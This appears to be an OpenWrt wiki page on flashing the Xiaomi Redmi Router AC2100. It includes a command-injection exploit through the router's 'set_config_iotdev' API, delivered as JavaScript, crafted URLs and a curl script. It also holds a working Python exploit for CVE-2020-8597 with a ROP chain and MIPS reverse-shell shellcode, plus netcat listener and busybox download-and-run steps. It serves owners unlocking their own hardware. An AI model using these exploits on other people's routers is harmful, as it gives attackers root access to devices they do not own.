@@ -1,0 +1,2647 @@
+====== Xiaomi Redmi Router AC2100 ======
+
+The Xiaomi Redmi Router AC2100 is a wireless router based on the MT7621 platform. While it can be acquired for relatively low cost compared to other units with similar specifications, it requires a somewhat complex installation process in order to bypass a locked down stock firmware to install OpenWrt. However, a recently discovered web exploit has facilitated the procedure significantly.
+
+{{media:xiaomi:redmi-router-ac2100.jpg?200|Xiaomi Redmi Router AC2100}}
+
+
+===== Supported Versions =====
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["brand", "model", "supportedcurrentrel", "oemdevicehomepageurl", "owrt_forum_topic_url", "deviceid"],
+  "filterColumns": {"model": "^Redmi Router AC2100$"}
+} -->
+
+
+===== Hardware Highlights =====
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["model", "cpu", "cpumhz", "cpucores", "flashmb", "rammb", "wlanhardware", "wlan24ghz", "wlan50ghz", "ethernet1gports", "modem", "usbports"],
+  "filterColumns": {"model": "^Redmi Router AC2100$"}
+} -->
+
+
+
+===== Installation =====
+**Release**
+<!-- ToH: {
+  "source": "json",
+  "dom": "t",
+  "paging": false,
+  "rotate": true,
+  "shownColumns": ["model", "supportedcurrentrel", "firmwareopenwrtinstallurl", "firmwareopenwrtupgradeurl", "firmwareoemstockurl"],
+  "filterColumns": {"model": "^Redmi Router AC2100$"}
+} -->
+
+==== Method A: Web Exploit ====
+
+From [[https://forum.openwrt.org/t/xiaomi-ax3600-ssh-guide/65438|Xiaomi AX3600 SSH Guide]] for the [[toh:xiaomi:ax3600]] router.
+
+
+=== Requirements ===
+
+  - A computer with an ethernet adapter
+  - One ethernet cable
+  - MiWifi (stock) firmware version 2.0.23 installed on the router
+  - The OpenWrt installation images for this device (from table above)
+  - An SSH client
+
+//This exploit also works with firmware 2.0.503//
+
+=== Obtain SSH Access using a Web Exploit ===
+
+  - Upgrade/downgrade to [[ https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin|stock firmware version 2.0.23]] (md5sum ca32a6cb7e60df65a391fe5f235fb720)
+  - Connect the computer to one of the ethernet ports of the router (not the //Internet// port)
+  - Set the router admin password via the router [[toh:xiaomi:xiaomi_redmi_router_ac2100#Stock Web Interface|web interface]]
+  - Login to the web interface using the password you just set and get the value of ''stok='' from the URL: <code>http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/web/home#router</code>
+  - Think of a password for SSH logins (8+ chars long, no special chars)
+  - Enable SSH and set the SSH password by using one of these three methods:
+
+<tabbox Using JavaScript in the web console>
+
+After login, open the web console in your browser (e.g. by pressing ''F12'' in Firefox), paste the following JavaScript code and press Enter. It will get the ''stok''-token from the URL, send a request to enable SSH and query you to set the SSH password.
+
+[[https://gist.github.com/steelywing/bdfe5a72a7fa4c34e3fa4f74379b156a]]
+
+<code>
+function getSTOK() {
+    let match = location.href.match(/;stok=(.*?)\//);
+    if (!match) {
+        return null;
+    }
+    return match[1];
+}
+
+function execute(stok, command) {
+    command = encodeURIComponent(command);
+    let path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&user_id=SteelyWing&ssid=-h%0A${command}%0A`;
+    console.log(path);
+    return fetch(new Request(location.origin + path));
+}
+
+function enableSSH() {
+    stok = getSTOK();
+    if (!stok) {
+        console.error('stok not found in URL');
+        return;
+    }
+    console.log(`stok = "${stok}"`);
+
+    password = prompt('Input new SSH password');
+    if (!password) {
+        console.error('You must input password');
+        return;
+    }
+
+    execute(stok, 
+`
+nvram set ssh_en=1
+nvram commit
+sed -i 's/channel=.*/channel=\\"debug\\"/g' /etc/init.d/dropbear
+/etc/init.d/dropbear start
+`
+    )
+        .then((response) => response.text())
+        .then((text) => console.log(text));
+    console.log('New SSH password: ' + password);
+    execute(stok, `echo -e "${password}\\n${password}" | passwd root`)
+        .then((response) => response.text())
+        .then((text) => console.log(text));
+}
+
+enableSSH();
+</code>
+
+<tabbox Manually entering URLs>
+
+Access the following URL in a browser to enable SSH on the router. Replace ''<STOK>'' with the value gained above.
+
+[[http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B]]
+
+... will execute the following commands:
+
+<code>
+nvram set ssh_en=1;
+nvram commit;
+sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear;
+/etc/init.d/dropbear start;
+</code>
+
+Enter the next URL to set the SSH root password to ''<PASSWORD>'' (replace it with your new root password).
+
+[[http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Aecho%20-e%20%27<PASSWORD>%5Cn<PASSWORD>%27%20%7C%20passwd%20root%0A]]
+
+... will execute the following commands:
+
+<code>echo -e "<PASSWORD>\n<PASSWORD>" | passwd root</code>
+
+You can actually execute any shell code like this:
+
+[[http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0A<YOUR-CODE>%0A]]
+
+<tabbox Using a Shell script>
+
+If you unable to gain SSH access from the above methods, you can try this bash script (which actually does the same thing using ''curl'').
+
+<code>
+rawurlencode() {
+  local string="${1}"
+  local strlen=${#string}
+  local encoded=""
+  local pos c o
+
+  for (( pos=0 ; pos<strlen ; pos++ )); do
+     c=${string:$pos:1}
+     case "$c" in
+        [-_.~a-zA-Z0-9] ) o="${c}" ;;
+        * )               printf -v o '%%%02x' "'$c"
+     esac
+     encoded+="${o}"
+  done
+  echo "${encoded}"    # You can either set a return variable (FASTER) 
+  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
+}
+
+xiaomiCmd() {
+    parsed=$(rawurlencode "$1")
+    url="http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/misystem/set_config_iotdev?bssid=redmi&user_id=doctor&ssid=-h%0A$parsed%0A"
+    echo $url
+    curl "$url"
+    echo
+}
+
+enableSsh() {
+    xiaomiCmd "nvram set ssh_en=1;nvram commit"
+    xiaomiCmd "sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear"
+    xiaomiCmd "echo -e '$password\n$password' | passwd root"
+    xiaomiCmd "/etc/init.d/dropbear enable;/etc/init.d/dropbear start"
+}
+echo your have to enter stok and password variables before running enableSsh:
+echo 'stok=<STOK>'
+echo 'password=<PASSWORD>'
+echo enableSsh
+</code>
+
+</tabbox>
+
+=== Connect via SSH ===
+
+Log in to the router via SSH as ''root'', e.g. on a terminal (check [[docs:guide-quick-start:sshadministration|SSH access for newcomers]] if unsure)
+<code>ssh root@192.168.31.1</code>
+
+The password will be ''<PASSWORD>'', as we set it before.
+
+As soon you have shell access, execute:
+
+<code>
+# Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!
+nvram set uart_en=1
+nvram set boot_wait=on
+nvram set bootdelay=5
+
+# Set kernel1 as the booting kernel
+nvram set flag_try_sys1_failed=1
+
+# Commit our nvram changes
+nvram commit
+</code>
+
+=== Firmware Installation ===
+
+  - Copy the firmware files to the router.
+    * Open a new terminal on your computer and change to the directory where you downloaded the firmware files. To copy the files to the router, execute <code>
+scp openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin root@192.168.31.1:/tmp
+scp openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin root@192.168.31.1:/tmp
+</code>
+    * On Windows, you can use PSCP <code>
+pscp -scp -P 22 -pw <PASSWORD> openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin root@192.168.31.1:/tmp
+pscp -scp -P 22 -pw <PASSWORD> openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin root@192.168.31.1:/tmp
+</code>
+    * Alternatively, download the firmware directly from the router using ''wget''. As the router doesn't support ''https'', a mirror must be used. In the terminal connected to the router through SSH, execute <code>
+cd /tmp
+wget http://openwrt.tetaneutral.net/releases/23.05.3/targets/ramips/mt7621/openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin
+wget http://openwrt.tetaneutral.net/releases/23.05.3/targets/ramips/mt7621/openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin
+</code>
+  - Back in the terminal connected to the router through SSH, change to the directory where the firmware files are <code>cd /tmp</code>
+  - Flash the kernel <code>mtd write openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1</code>
+  - Flash the rootfs <code>mtd -r write openwrt-23.05.3-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0</code>
+
+If all has gone well, the router will reboot to OpenWrt. If not, please wait at least 5 minutes, try manually rebooting the router.
+
+==== Method B: Python Exploit ====
+
+Installation of OpenWrt on this device requires exploiting [[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8597|CVE-2020-8597]] to achieve shell access.
+
+=== Requirements ===
+
+  - A computer with an ethernet adapter
+  - Two ethernet cables
+  - python (python3 was used in this example), scapy, netcat, a statically compiled [[https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/|mipsel busybox]] binary (take "busybox-mipsel" version) and a HTTP server (or use the mini http module from python, see example below)
+  - The OpenWrt images for this device (Specifically the ''openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin'' and ''openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin'' images)
+  - The python scripts below
+
+== Exploit script ==
+
+We will be referring to this as ''cve.py'' throughout the process.
+
+Note that on line 17 where it says ''if src.startswith("88:c3:97") or src.startswith("8c:53:c3")'' replace one of those MAC addresses with the beginning of your MAC address that is written on the sticker that's attached to your router.
+
+<hidden Show ''cve.py''>
+<code>
+# Based on a PoC by "WinMin" (https://github.com/WinMin/CVE-2020-8597)
+from scapy.all import *
+from socket import *
+
+interface = "eth0"
+
+def mysend(pay,interface = interface):
+    sendp(pay, iface = interface)
+
+def packet_callback(packet):
+
+    global sessionid, src, dst
+    sessionid = int(packet['PPP over Ethernet'].sessionid)
+    dst = (packet['Ethernet'].dst)
+    src = (packet['Ethernet'].src)
+    # In case we pick up Router -> PPPoE server packet
+    if src.startswith("88:c3:97") or src.startswith("8c:53:c3") :
+        src,dst = dst,src
+    print("sessionid:" + str(sessionid))
+    print("src:" + src)
+    print("dst:" + dst)
+
+def eap_response_md5():
+
+    md5 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"
+
+    # Reverse shell, connect to 192.168.31.177:31337, written by Jacob Holcomb
+
+    stg3_SC =  b"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
+    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+    stg3_SC += b"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+    stg3_SC += b"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
+    stg3_SC += b"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
+    stg3_SC += b"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
+    stg3_SC += b"\xf8\xff\xa5\xaf\x1f\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
+    stg3_SC += b"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
+    stg3_SC += b"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
+    stg3_SC += b"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
+    stg3_SC += b"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
+    stg3_SC += b"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
+    stg3_SC += b"\xab\x0f\x02\x24\x0c\x09\x09\x01"
+
+    reboot_shell =  b"\x23\x01\x06\x3c"
+    reboot_shell += b"\x67\x45\xc6\x34"
+    reboot_shell += b"\x12\x28\x05\x3c"
+    reboot_shell += b"\x69\x19\xa5\x24"
+    reboot_shell += b"\xe1\xfe\x04\x3c"
+    reboot_shell += b"\xad\xde\x84\x34"
+    reboot_shell += b"\xf8\x0f\x02\x24"
+    reboot_shell += b"\x0c\x01\x01\x01"
+
+    s0 = b"\x40\x61\xF1\x77" # uclibc sleep() base + 0x6c140 = 77F16140
+    s1 = b"\x01\x00\x00\x00"
+    s2 = b"\x41\x41\x41\x41"
+    s3 = b"\x00\x64\xFF\x7F" # 7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]
+    s4 = b"\x88\xe1\x40\x00" # pppd.txt:0x0040e188
+    s5 = b"\x00\x00\x00\x00"
+
+    ra = b"\x0C\x81\xF1\x77" # libuClibc.txt:0x0006e10c 77F1810C
+
+    rop_chain =  (b'A' * 0x184)
+    rop_chain += s0
+    rop_chain += s1
+    rop_chain += s2
+    rop_chain += s3
+    rop_chain += s4
+    rop_chain += s5
+    rop_chain += ra
+    # Nop slide
+    rop_chain += (b'\x00' * 0x100)
+    # Small reboot shellcode for testing
+    #rop_chain += reboot_shell
+    rop_chain += stg3_SC
+    # Just padding the end a little, since the last byte gets set to 0x00 and not everyone uses a 4 * 0x00 as nop
+    rop_chain += (b'\x00' * 0x4)
+    pay = Ether(dst=dst,src=src,type=0x8864)/PPPoE(code=0x00,sessionid=sessionid)/PPP(proto=0xc227)/EAP_MD5(id=100,value=md5,optional_name=rop_chain)
+    mysend(pay)
+
+
+if __name__ == '__main__':
+    sniff(prn=packet_callback,iface=interface,filter="pppoes",count=1)
+
+    eap_response_md5()
+</code>
+</hidden>
+
+== PPPoE simulator ==
+
+From https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit
+
+We will refer to this as ''pppoe-simulator.py'' throughout this process.
+
+<hidden Show ''pppoe-simulator.py''>
+<code>
+from scapy.all import *
+from scapy.layers.ppp import *
+
+# In most cases you just have to change this:
+interface = "eth0"
+
+
+ac_name = "PPPoE-Simulator"
+service_name = ""
+magic_number = 0xDEADBEEF
+host_uniq = session_id = ac_cookie = mac_router = mac_server = eth_discovery = eth_session = b'\0'
+ident = 0
+
+End_Of_List = 0x0000
+Service_Name = 0x0101
+AC_Name = 0x0102
+Host_Uniq = 0x0103
+AC_Cookie = 0x0104
+Vendor_Specific = 0x0105
+Relay_Session_Id = 0x0110
+Service_Name_Error = 0x0201
+AC_System_Error = 0x0202
+Generic_Error = 0x0203
+
+PADI = 0x09
+PADO = 0x07
+PADR = 0x19
+PADS = 0x65
+PADT = 0xa7
+
+LCP = 0xc021
+PAP = 0xc023
+CHAP = 0xc223
+IPCP = 0x8021
+IPV6CP = 0x8057
+PPPoE_Discovery = 0x8863
+PPPoE_Session = 0x8864
+
+Configure_Request = 1
+Configure_Ack = 2
+Authenticate_Ack = 2
+Configure_Nak = 3
+Configure_Reject = 4
+Terminate_Request = 5
+Terminate_Ack = 6
+Code_Reject = 7
+Protocol_Reject = 8
+Echo_Request = 9
+Echo_Reply = 10
+Discard_Request = 11
+
+
+def packet_callback(pkt):
+    global host_uniq, session_id, ident, ac_cookie, mac_router, mac_server, eth_discovery, eth_session
+    mac_router = pkt[Ether].src
+    eth_discovery = Ether(src=mac_server, dst=mac_router, type=PPPoE_Discovery)
+    eth_session = Ether(src=mac_server, dst=mac_router, type=PPPoE_Session)
+
+    if pkt.haslayer(PPPoED):
+        if pkt[PPPoED].code == PADI:
+            session_id = pkt[PPPoED].fields['sessionid']
+            ac_cookie = os.urandom(20)
+            for tag in pkt[PPPoED][PPPoED_Tags].tag_list:
+                if tag.tag_type == Host_Uniq:
+                    host_uniq = tag.tag_value
+            print("Client->Server   |   Discovery Initiation")
+            print("Server->Client   |   Discovery Offer")
+            sendp(eth_discovery /
+                  PPPoED(code=PADO, sessionid=0) /
+                  PPPoETag(tag_type=Service_Name, tag_value=service_name) /
+                  PPPoETag(tag_type=AC_Name, tag_value=ac_name) /
+                  PPPoETag(tag_type=AC_Cookie, tag_value=ac_cookie) /
+                  PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq))
+        elif pkt[PPPoED].code == PADR:
+            print("Client->Server   |   Discovery Request")
+            print("Server->Client   |   Discovery Session-confirmation")
+            session_id = os.urandom(2)[0]
+            sendp(eth_discovery /
+                  PPPoED(code=PADS, sessionid=session_id) /
+                  PPPoETag(tag_type=Service_Name, tag_value=service_name) /
+                  PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq))
+            print("Server->Client   |   Configuration Request (PAP)")
+            sendp(eth_session /
+                  PPPoE(sessionid=session_id) /
+                  PPP(proto=LCP) /
+                  PPP_LCP(code=Configure_Request, id=ident + 1, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1492)) /
+                                                                      Raw(PPP_LCP_Auth_Protocol_Option(
+                                                                       auth_protocol=PAP)) /
+                                                                      Raw(PPP_LCP_Magic_Number_Option(
+                                                                       magic_number=magic_number)))))
+
+    elif pkt.haslayer(PPPoE) and pkt.haslayer(PPP):
+        if pkt[PPPoE].sessionid != 0:
+            session_id = pkt[PPPoE].sessionid
+        if pkt.haslayer(PPP_LCP_Configure):
+            ppp_lcp = pkt[PPP_LCP_Configure]
+            if pkt[PPP_LCP_Configure].code == Configure_Request:
+                ident = pkt[PPP_LCP_Configure].id
+                print("Client->Server   |   Configuration Request (MRU)")
+                print("Server->Client   |   Configuration Ack (MRU)")
+                sendp(eth_session /
+                      PPPoE(sessionid=session_id) /
+                      PPP(proto=LCP) /
+                      PPP_LCP(code=Configure_Ack, id=ident, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1480)) /
+                                                                  Raw(ppp_lcp[PPP_LCP_Magic_Number_Option]))))
+            elif pkt[PPP_LCP_Configure].code == Configure_Ack:
+                print("Client->Server   |   Configuration Ack")
+                print("Server->Client   |   Echo Request")
+                sendp(eth_session /
+                      PPPoE(sessionid=session_id) /
+                      PPP(proto=LCP) /
+                      PPP_LCP_Echo(code=Echo_Request, id=ident + 1, magic_number=magic_number))
+        elif pkt.haslayer(PPP_LCP_Echo):
+            if pkt[PPP_LCP_Echo].code == Echo_Request:
+                ident = pkt[PPP_LCP_Echo].id
+                print("Client->Server   |   Echo Request")
+                print("Server->Client   |   Echo Reply")
+                sendp(eth_session /
+                      PPPoE(sessionid=session_id) /
+                      PPP(proto=LCP) /
+                      PPP_LCP_Echo(code=Echo_Reply, id=ident, magic_number=magic_number))
+        elif pkt.haslayer(PPP_PAP_Request):
+            ident = pkt[PPP_PAP_Request].id
+            print("Client->Server   |   Authentication Request")
+            print("Server->Client   |   Authenticate Ack")
+            sendp(eth_session /
+                  PPPoE(sessionid=session_id) /
+                  PPP(proto=PAP) /
+                  PPP_PAP_Response(code=Authenticate_Ack, id=ident, message="Login ok"))
+            print("Server->Client   |   Configuration Request (IP)")
+            sendp(eth_session /
+                  PPPoE(sessionid=session_id) /
+                  PPP(proto=IPCP) /
+                  PPP_IPCP(code=Configure_Request, id=ident + 1, options=PPP_IPCP_Option_IPAddress(data="10.15.0.8")))
+        elif pkt.haslayer(PPP_IPCP):
+            ident = pkt[PPP_IPCP].id
+            if pkt[PPP_IPCP].options[0].data == "0.0.0.0":
+                options = [PPP_IPCP_Option_IPAddress(data="10.16.0.9"),
+                           PPP_IPCP_Option_DNS1(data="114.114.114.114"),
+                           PPP_IPCP_Option_DNS2(data="114.114.114.114")]
+                print("Client->Server   |   Configuration Request (invalid)")
+                print("Server->Client   |   Configuration Nak")
+                sendp(eth_session /
+                      PPPoE(sessionid=session_id) /
+                      PPP(proto=IPCP) /
+                      PPP_IPCP(code=Configure_Nak, id=ident, options=options))
+            else:
+                print("Client->Server   |   Configuration Request (valid)")
+                print("Server->Client   |   Configuration Ack")
+                sendp(eth_session /
+                      PPPoE(sessionid=session_id) /
+                      PPP(proto=IPCP) /
+                      PPP_IPCP(code=Configure_Ack, id=ident, options=pkt[PPP_IPCP].options))
+        if pkt[PPP].proto == IPV6CP:
+            print("Client->Server   |   Configuration Request IPV6CP")
+            print("Server->Client   |   Protocol Reject IPV6CP")
+            sendp(eth_session /
+                  PPPoE(sessionid=session_id) /
+                  PPP(proto=LCP) /
+                  PPP_LCP_Protocol_Reject(code=Protocol_Reject, id=ident + 1, rejected_protocol=IPV6CP,
+                                          rejected_information=pkt[PPP].payload))
+
+
+def terminateConnection():
+    print("Server->Client   |   Terminate Connection")
+    sendp(eth_session /
+          PPPoE(sessionid=session_id) /
+          PPP(proto=LCP) /
+          PPP_LCP_Terminate())
+
+
+def isNotOutgoing(pkt):
+    if pkt.haslayer(Ether):
+        return pkt[Ether].src != mac_server
+    return False
+
+
+if __name__ == '__main__':
+    conf.verb = 0  # Suppress Scapy output
+    conf.iface = interface  # Set default interface
+    mac_server = get_if_hwaddr(interface)
+    print("Waiting for packets")
+    sniff(prn=packet_callback, filter="pppoed or pppoes", lfilter=isNotOutgoing)
+</code>
+</hidden>
+
+=== Instructions ===
+
+//Some of these commands may require to be run as root.//
+
+== Initial setup ==
+
+  - Setup your ethernet interface with the ip address: 192.168.31.177
+  - If on windows OR your interface is not eth0: adjust the scripts to use correct interface instead of eth0
+  - Bridge the WAN port on the router with one of the LAN ports on the router by connecting an ethernet cable between them.
+  - Connect your computer to the router with your other ethernet cable.
+
+<code>
+# Start our PPPoE emulator
+python3 pppoe-simulator.py
+</code>
+
+Now we can run our router through the initial setup wizard on ''%%http://192.168.31.1%%'', during which PPPoE should be auto-detected and chosen. Any combination of credentials are acceptable.
+If you are not sure which chinese symbols to click, there is a really helpful guide with pictures available here: [[https://github.com/impulse/ac2100-openwrt-guide]]. In case you make a mistake with the chinese configuration, get stuck before you finish the exploit and need to reset to factory defaults, hold the reset button for 10 seconds and wait for reboot.
+
+
+
+<code>
+# A quick http server for the current directory (ie. Where you have placed your OpenWrt images), or use your own small http server
+python -m http.server 80
+# And in another window...
+netcat -nvlp 31337
+</code>
+
+== Running the exploit ==
+
+<code>
+# In another window to trigger the exploit
+python3 cve.py
+</code>
+
+In your terminal with netcat open you should see an incoming connection from the router, and we can begin typing in commands to be run on the router.
+
+If you don't see a connection, your router may have a different MAC address. Please adjust ''cve.py'' accordingly.
+
+<code>
+# cve.py#L17
+if src.startswith("your:router:mac")
+</code>
+
+It is recommended to quickly wget the busybox binary over and start telnetd as the reverse shell is somewhat unstable and disconnect randomly. In most cases you will only have a few seconds, so be ready to paste the whole block in one go.
+
+<code>
+cd /tmp
+wget http://192.168.31.177/busybox
+chmod a+x ./busybox
+./busybox telnetd -l /bin/sh
+</code>
+
+If you are disconnected prematurely, just start the netcat listener and exploit script again.
+
+After you the code above has been executed, you will have secured telnet access to the device, and can now wget the OpenWrt images onto the device and flash them.
+
+== Writing the OpenWrt images ==
+After connecting via telnet to 192.168.31.1 :
+
+<code>
+wget http://192.168.31.177/openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin
+wget http://192.168.31.177/openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin
+# Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!
+nvram set uart_en=1
+nvram set boot_wait=on
+nvram set bootdelay=5
+# Set kernel1 as the booting kernel
+nvram set flag_try_sys1_failed=1
+# Commit our nvram changes
+nvram commit
+# Flash the kernel
+mtd write openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1
+# Flash the rootfs and reboot
+mtd -r write openwrt-21.02.0-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0
+</code>
+
+If all has gone well, the router will reboot and should boot to OpenWrt. If not, try manually rebooting the router. You can now proceed to installing LuCI.
+
+
+==== Stock Web Interface ====
+
+For both installation methods, a few steps are taken via the web interface of the stock firmware. Navigation can be challenging if you cannot read Chinese. Therefore, some screenshots from firmware version 2.0.23 are given here as a reference.
+
+The web interface is reached at ''192.168.31.1'' by default. After a reset, you first have to acknowledge some terms and conditions (press the blue button).
+
+{{:media:xiaomi:redmi-ac2100-webinterface-step1.png?400|}}
+
+The router will now take some time to try to connect to the internet. Continue by clicking the blue words at the very bottom of the next page.
+
+{{:media:xiaomi:redmi-ac2100-webinterface-step2.png?400|}}
+
+You can now either set credentials for and activate PPPoE (for installation method B) or set the router password (for method A). Confirm your action using the blue button at the bottom in both cases.
+
+{{:media:xiaomi:redmi-ac2100-webinterface-step3.png?400|}}
+
+Note: 
+In my case this was only step 1 to get to the actual login page to perform the Option A. 
+Step 2 involved setting the WiFi (Do not ask my why it wouldn't let me open the login page without setting the WiFi)
+To do this - I actually had to click on DHCP
+
+I wish to upload a screenshot at this point but get the message as user for 10+ years of openWrt I have no rights to help fellow users of OpenWrt - so then you just gotta do it here with my text. Click on DHCP - which opens for a weird reason the WiFi settings. Set a password for your Wifi and click at the bottom of the page the blue button. Now you can access the login screen and perform option A to install OpenWrt
+
+
+===== Debricking =====
+-> [[docs:guide-user:troubleshooting:generic.debrick]]
+
+==== Stock recovery ====
+
+This device accepts stock signed firmware images from Xiaomi, when booted to PXE (Preboot Execution Environment).
+PXE can be triggered by holding down the reset button on the device while powering on, until the status light flashes amber.
+
+To recover with stock recovery:
+Suitable file with firmware should be downloaded from Miwifi website.
+File should be renamed to "miwifi.bin" (without quotes).
+
+DHCP server and TFTP server should be configured on the PC/MAC.
+
+Below is an example dnsmasq configuration that will serve /tmp/miwifi.bin
+
+<code>
+port=0
+interface=eth0
+bind-interfaces
+dhcp-range=192.168.31.50,192.168.31.150,12h
+dhcp-boot=miwifi.bin
+enable-tftp
+tftp-root=/tmp
+</code>
+
+[[https://mohammadthalif.wordpress.com/2010/03/05/installing-and-testing-tftpd-in-ubuntudebian/|Here]] is another guide for setting TFTP server on Ubuntu.
+
+When DHCP and TFTP servers are ready and running, boot to PXE and send the miwifi.bin file to the router.
+
+After the device flashes the image from TFTP, it will flash the status light white and you can then power-cycle the device.
+
+Alternatively, Xiaomi also offer MiWifiRepairToolx86 for Windows.
+[[http://www1.miwifi.com/miwifi_download.html|Link to download page]]
+
+==== BREED recovery ====
+=== What is BREED ===
+[[docs:techref:bootloader:breed|BREED]]
+ is custom router bootloader (PXE), it is somewhat similar to custom recovery on Android mobile phones. It lets you backup and install different firmware on routers, and change some boot settings.
+BREED language is Chinese.
+
+=== Why to install it ===
+BREED adds more certainty when upgrading and flashing different firmware. With BREED installed, it's much easier to recover soft bricked device.
+
+=== BREED installation ===
+The file used is the one for Xiaomi Router 3G, it works well on R2100 and AC2100
+
+Get ssh or telnet access: 
+  * If installing during the provided guide for OpenWrt installation: breed-mt7621-xiaomi-r3g.bin should be downloaded first and copied to same location of OpenWrt files.  
+  * If you have DD-WRT or OpenWrt already installed just connect with terminal.
+
+For internet connected installation type in the following commands:
+
+<code>
+cd /tmp
+wget --no-check-certificate https://breed.hackpascal.net/breed-mt7621-xiaomi-r3g.bin
+mtd write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader
+</code>
+
+For installation using guide make sure you have the "breed-mt7621-xiaomi-r3g.bin" file in same location. Type the following commands before or after the "Writing the OpenWrt images"
+<code>
+cd /tmp
+wget http://192.168.31.177/breed-mt7621-xiaomi-r3g.bin
+mtd write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader
+</code>
+
+You can verify the MD5 if you wish before the mtd write with:
+<code>
+md5sum /tmp/breed-mt7621-xiaomi-r3g.bin
+</code>
+if the "--no-check-certificate" doesn't work for you, remove it from the command.
+
+If in OpenWrt, and has the error ''Could not open mtd device: Bootloader''
+
+<code>
+opkg install kmod-mtd-rw
+insmod mtd-rw i_want_a_brick=1
+mtd write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader
+</code>
+
+If you have DD-WRT installed, use
+<code>
+mtd_write write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader
+</code>
+or
+<code>
+mtd_write2 write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader
+</code>
+instead of "mtd write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader"
+
+=== Breed with non-stock software ===
+If you use OpenWrt or any other non-stock ROM:
+
+After flashing breed you have to boot to breed and set it to boot kernel1 partition.
+**Otherwise the router will boot loop.** You can enter breed when it's in boot loop.
+To enter breed:
+It can be triggered by holding down the reset button on the device while powering on, until the status light flashes amber.\
+Access breed at 192.168.1.1 with Telnet or browser GUI.
+Type the following in to the breed terminal:
+
+<code>
+env set autoboot.command "boot flash 0x600000"
+env save
+</code>
+
+or
+
+<code>
+env set xiaomi.r3g.bootfw 2
+env save
+</code>
+
+or set it in BREED web GUI.
+
+=== Returning to stock ===
+The boot address must be changed back when returning to stock.
+<code>
